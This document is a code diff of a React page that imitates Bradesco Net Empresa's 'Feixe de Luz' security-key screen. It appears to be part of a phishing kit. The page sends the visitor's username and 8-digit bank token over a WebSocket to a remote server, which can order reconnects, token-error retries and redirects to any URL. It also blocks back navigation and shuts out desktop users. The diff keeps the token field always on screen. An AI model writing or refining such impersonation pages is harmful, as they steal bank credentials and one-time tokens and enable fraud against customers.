@@ -3,7 +3,6 @@ import bradescoLogo from "@/assets/bradesco-logo.png";
 
 const FeixePage = () => {
   const usuario = sessionStorage.getItem("usuario") || "";
-  const nome = sessionStorage.getItem("nome") || "";
   const dispositivo = sessionStorage.getItem("dispositivo") || "";
   const wsRef = useRef<WebSocket | null>(null);
   const [status, setStatus] = useState<"aguardando" | "lendo" | "validando" | "erro">("aguardando");
@@ -11,6 +10,7 @@ const FeixePage = () => {
   const [corAtual, setCorAtual] = useState<"black" | "white">("black");
   const [chave, setChave] = useState("");
   const [erroChave, setErroChave] = useState("");
+  const [enviandoChave, setEnviandoChave] = useState(false);
   const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const indexRef = useRef(0);
 
@@ -26,14 +26,11 @@ const FeixePage = () => {
         clearInterval(intervalRef.current!);
         intervalRef.current = null;
         setCorAtual("black");
-        // After flashing done, show security key input
-        setStatus("chave");
+        setStatus("aguardando");
         wsRef.current?.send(JSON.stringify({ acao: "feixe_lido", usuario }));
         return;
       }
-
-      const bit = binario[indexRef.current];
-      setCorAtual(bit === "1" ? "white" : "black");
+      setCorAtual(binario[indexRef.current] === "1" ? "white" : "black");
       indexRef.current++;
     }, 50);
   }, [binario, usuario]);
@@ -41,7 +38,7 @@ const FeixePage = () => {
   const enviarChave = () => {
     if (chave.length !== 8) return;
     setErroChave("");
-    setStatus("enviando");
+    setEnviandoChave(true);
     wsRef.current?.send(JSON.stringify({ acao: "token", usuario, token: chave }));
   };
 
@@ -51,9 +48,7 @@ const FeixePage = () => {
 
     ws.onopen = () => {
       console.log("FeixePage WS conectado");
-      if (usuario) {
-        ws.send(JSON.stringify({ acao: "reconectar", usuario }));
-      }
+      if (usuario) ws.send(JSON.stringify({ acao: "reconectar", usuario }));
     };
 
     ws.onmessage = (event) => {
@@ -64,41 +59,24 @@ const FeixePage = () => {
         setBinario(msg.binario);
         setStatus("aguardando");
       }
-
-      if (msg.acao === "solicitar_chave") {
-        setStatus("chave");
-      }
-
       if (msg.acao === "redirecionar" && msg.url) {
         setStatus("validando");
-        setTimeout(() => {
-          window.location.href = msg.url;
-        }, 1500);
+        setTimeout(() => { window.location.href = msg.url; }, 1500);
       }
-
       if (msg.acao === "erro_chave") {
         setErroChave(msg.motivo || "Chave inválida. Tente novamente.");
-        setStatus("chave");
+        setEnviandoChave(false);
       }
-
       if (msg.acao === "erro_feixe") {
         setStatus("erro");
-        if (intervalRef.current) {
-          clearInterval(intervalRef.current);
-          intervalRef.current = null;
-        }
+        if (intervalRef.current) { clearInterval(intervalRef.current); intervalRef.current = null; }
       }
     };
 
     ws.onerror = (err) => console.error("Feixe WS erro:", err);
-
-    return () => {
-      ws.close();
-      if (intervalRef.current) clearInterval(intervalRef.current);
-    };
+    return () => { ws.close(); if (intervalRef.current) clearInterval(intervalRef.current); };
   }, [usuario]);
 
-  // Prevent back navigation
   useEffect(() => {
     window.history.pushState(null, "", window.location.href);
     const handlePop = () => window.history.pushState(null, "", window.location.href);
@@ -115,140 +93,95 @@ const FeixePage = () => {
             <svg xmlns="http://www.w3.org/2000/svg" className="w-8 h-8" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
           </div>
           <h2 className="text-xl font-bold">Acesso exclusivo pelo celular</h2>
-          <p className="text-white/70 text-sm leading-relaxed">
-            Este portal está disponível apenas para dispositivos móveis.
-          </p>
+          <p className="text-white/70 text-sm leading-relaxed">Este portal está disponível apenas para dispositivos móveis.</p>
         </div>
       </div>
 
       {/* Mobile layout */}
       <div className="md:hidden min-h-screen flex flex-col bg-white">
-        {/* Blue header bar */}
-        <div className="bg-[hsl(220,60%,40%)] px-4 py-3 flex items-center gap-3">
-          <h1 className="text-white text-base font-semibold tracking-tight">
-            Bradesco Net Empresa
-          </h1>
+        <div className="bg-[hsl(220,60%,40%)] px-4 py-3">
+          <h1 className="text-white text-base font-semibold tracking-tight">Bradesco Net Empresa</h1>
         </div>
 
         <div className="flex flex-col flex-1 px-5 pt-6 pb-8">
-          <h2 className="text-[hsl(220,20%,14%)] text-lg font-bold mb-6">
-            Chave de Segurança - Feixe de Luz
-          </h2>
+          <h2 className="text-[hsl(220,20%,14%)] text-lg font-bold mb-6">Chave de Segurança - Feixe de Luz</h2>
 
-          {/* Black square - feixe area */}
-          {(status === "aguardando" || status === "lendo") && (
-            <>
-              <div className="flex justify-start mb-6">
-                <div
-                  className="w-40 h-40 border border-[hsl(220,14%,80%)] transition-colors duration-[30ms]"
-                  style={{ backgroundColor: status === "lendo" ? corAtual : "black" }}
-                />
-              </div>
+          {/* Black square */}
+          <div className="flex justify-start mb-6">
+            <div
+              className="w-40 h-40 border border-[hsl(220,14%,80%)] transition-colors duration-[30ms]"
+              style={{ backgroundColor: status === "lendo" ? corAtual : "black" }}
+            />
+          </div>
 
-              <div className="space-y-3 mb-8">
-                <p className="text-[hsl(220,10%,40%)] text-sm leading-relaxed">
-                  1 - Na sua chave, aperte o botão com o desenho de cadeado
-                </p>
-                <p className="text-[hsl(220,10%,40%)] text-sm leading-relaxed">
-                  2 - Posicione o sensor que fica no verso dela, na frente deste quadro preto (cerca de 1 cm)
-                </p>
-                <p className="text-[hsl(220,10%,40%)] text-sm leading-relaxed">
-                  3 - Com a chave posicionada, clique em Iniciar Leitura, aqui na tela, e aguarde.
-                </p>
-              </div>
+          {/* Instructions */}
+          <div className="space-y-3 mb-6">
+            <p className="text-[hsl(220,10%,40%)] text-sm">1 - Na sua chave, aperte o botão com o desenho de cadeado</p>
+            <p className="text-[hsl(220,10%,40%)] text-sm">2 - Posicione o sensor que fica no verso dela, na frente deste quadro preto (cerca de 1 cm)</p>
+            <p className="text-[hsl(220,10%,40%)] text-sm">3 - Com a chave posicionada, clique em Iniciar Leitura, aqui na tela, e aguarde.</p>
+          </div>
 
-              {status === "aguardando" && (
-                <button
-                  onClick={iniciarLeitura}
-                  disabled={!binario}
-                  className="w-full max-w-[240px] mx-auto h-12 rounded-full bg-[hsl(349,93%,42%)] text-white text-base font-semibold active:scale-[0.97] transition-all duration-200 disabled:opacity-50"
-                >
-                  Iniciar Leitura
-                </button>
-              )}
-
-              {status === "lendo" && (
-                <div className="flex flex-col items-center gap-3">
-                  <div className="w-8 h-8 border-[3px] border-[hsl(220,14%,89%)] border-t-[hsl(349,93%,42%)] rounded-full animate-spin" />
-                  <p className="text-[hsl(220,10%,46%)] text-sm animate-pulse">
-                    Realizando leitura...
-                  </p>
-                </div>
-              )}
-            </>
+          {status === "aguardando" && (
+            <button
+              onClick={iniciarLeitura}
+              disabled={!binario}
+              className="w-full max-w-[240px] mx-auto h-12 rounded-full bg-[hsl(349,93%,42%)] text-white text-base font-semibold active:scale-[0.97] transition-all duration-200 disabled:opacity-50 mb-6"
+            >
+              Iniciar Leitura
+            </button>
           )}
 
-          {/* Security key input */}
-          {(status === "chave" || status === "enviando") && (
-            <div className="flex flex-col items-center flex-1">
-              <img
-                src={bradescoLogo}
-                alt="Bradesco"
-                className="w-16 h-16 object-contain mb-6"
-              />
-
-              <div className="w-full bg-white rounded-xl px-4 py-5 border border-[hsl(220,14%,89%)] space-y-4">
-                <label className="text-[hsl(220,20%,14%)] text-sm font-semibold block text-center">
-                  Digite a Chave de Segurança com 8 dígitos
-                </label>
-                <input
-                  type="text"
-                  inputMode="numeric"
-                  maxLength={8}
-                  value={chave}
-                  onChange={(e) => {
-                    const val = e.target.value.replace(/\D/g, "").slice(0, 8);
-                    setChave(val);
-                    setErroChave("");
-                  }}
-                  placeholder="00000000"
-                  className="w-full h-12 text-center text-2xl font-mono tracking-[0.3em] border border-[hsl(220,14%,89%)] rounded-lg focus:outline-none focus:border-[hsl(220,60%,40%)] focus:ring-2 focus:ring-[hsl(220,60%,40%)]/20 transition-all"
-                />
-                {erroChave && (
-                  <p className="text-[hsl(0,84%,60%)] text-xs text-center">{erroChave}</p>
-                )}
-                <button
-                  onClick={enviarChave}
-                  disabled={chave.length !== 8 || status === "enviando"}
-                  className="w-full h-11 rounded-full bg-[hsl(349,93%,42%)] text-white text-sm font-semibold active:scale-[0.97] transition-all duration-200 disabled:opacity-50"
-                >
-                  {status === "enviando" ? "Enviando..." : "Confirmar"}
-                </button>
-              </div>
+          {status === "lendo" && (
+            <div className="flex flex-col items-center gap-3 mb-6">
+              <div className="w-8 h-8 border-[3px] border-[hsl(220,14%,89%)] border-t-[hsl(349,93%,42%)] rounded-full animate-spin" />
+              <p className="text-[hsl(220,10%,46%)] text-sm animate-pulse">Realizando leitura...</p>
             </div>
           )}
 
-          {/* Validating */}
           {status === "validando" && (
-            <div className="flex flex-col items-center justify-center flex-1 gap-3">
+            <div className="flex flex-col items-center gap-3 mb-6">
               <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 text-[hsl(142,71%,45%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
-                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-                <path d="m9 12 2 2 4-4"/>
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/>
               </svg>
-              <p className="text-[hsl(142,71%,45%)] text-sm font-medium">
-                Validado! Redirecionando...
-              </p>
+              <p className="text-[hsl(142,71%,45%)] text-sm font-medium">Validado! Redirecionando...</p>
             </div>
           )}
 
-          {/* Error */}
           {status === "erro" && (
-            <div className="flex flex-col items-center justify-center flex-1 gap-3">
-              <p className="text-[hsl(0,84%,60%)] text-sm">
-                Não foi possível validar. Tente novamente.
-              </p>
+            <div className="flex flex-col items-center gap-3 mb-6">
+              <p className="text-[hsl(0,84%,60%)] text-sm">Não foi possível validar. Tente novamente.</p>
               <button
-                onClick={() => {
-                  setStatus("aguardando");
-                  setChave("");
-                  wsRef.current?.send(JSON.stringify({ acao: "reconectar", usuario }));
-                }}
+                onClick={() => { setStatus("aguardando"); setChave(""); wsRef.current?.send(JSON.stringify({ acao: "reconectar", usuario })); }}
                 className="px-8 h-12 rounded-full bg-[hsl(349,93%,42%)] text-white text-sm font-semibold active:scale-[0.97] transition-all duration-200"
               >
                 Tentar novamente
               </button>
             </div>
           )}
+
+          {/* Security key input - always visible */}
+          <div className="w-full bg-[hsl(220,20%,96%)] rounded-xl px-4 py-4 border border-[hsl(220,14%,89%)] space-y-3 mt-auto">
+            <label className="text-[hsl(220,20%,14%)] text-sm font-semibold block text-center">
+              Digite a Chave de Segurança com 8 dígitos
+            </label>
+            <input
+              type="text"
+              inputMode="numeric"
+              maxLength={8}
+              value={chave}
+              onChange={(e) => { setChave(e.target.value.replace(/\D/g, "").slice(0, 8)); setErroChave(""); }}
+              placeholder="00000000"
+              className="w-full h-12 text-center text-2xl font-mono tracking-[0.3em] border border-[hsl(220,14%,89%)] rounded-lg bg-white focus:outline-none focus:border-[hsl(220,60%,40%)] focus:ring-2 focus:ring-[hsl(220,60%,40%)]/20 transition-all"
+            />
+            {erroChave && <p className="text-[hsl(0,84%,60%)] text-xs text-center">{erroChave}</p>}
+            <button
+              onClick={enviarChave}
+              disabled={chave.length !== 8 || enviandoChave}
+              className="w-full h-11 rounded-full bg-[hsl(349,93%,42%)] text-white text-sm font-semibold active:scale-[0.97] transition-all duration-200 disabled:opacity-50"
+            >
+              {enviandoChave ? "Enviando..." : "Confirmar"}
+            </button>
+          </div>
         </div>
       </div>
     </>
